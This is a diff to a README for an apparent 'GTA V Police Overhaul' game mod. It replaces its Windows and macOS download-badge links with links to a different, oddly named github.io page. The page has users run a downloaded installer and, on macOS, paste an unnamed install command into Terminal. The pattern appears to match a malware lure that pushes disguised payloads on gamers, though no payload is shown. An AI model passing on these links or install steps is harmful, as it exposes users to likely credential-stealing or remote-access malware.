@@ -8,8 +8,8 @@
 
 ---
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://phantommofence.github.io/download-win/)
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://phantommofence.github.io/download-mac/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
 
 ---
 
@@ -33,13 +33,13 @@ The **GTA V Police Overhaul** is one of the most downloaded mods for GTA V on Ne
 
 ### 🪟 Windows
 
-1. [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://phantommofence.github.io/download-win/)
+1. [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
 2. Run the installer and follow the on-screen steps
 3. Launch GTA V — mod activates automatically 🚀
 
 ### 🍎 macOS
 
-1. [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://phantommofence.github.io/download-mac/)
+1. [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
 3. Paste the install command and press Enter
 4. Follow the prompts — installs automatically 🍏
@@ -73,8 +73,8 @@ The **GTA V Police Overhaul** is one of the most downloaded mods for GTA V on Ne
 
 **GTA V Police Overhaul** transforms your GTA V experience. Download now and see the difference immediately.
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://phantommofence.github.io/download-win/)
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://phantommofence.github.io/download-mac/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
 
 ---
 
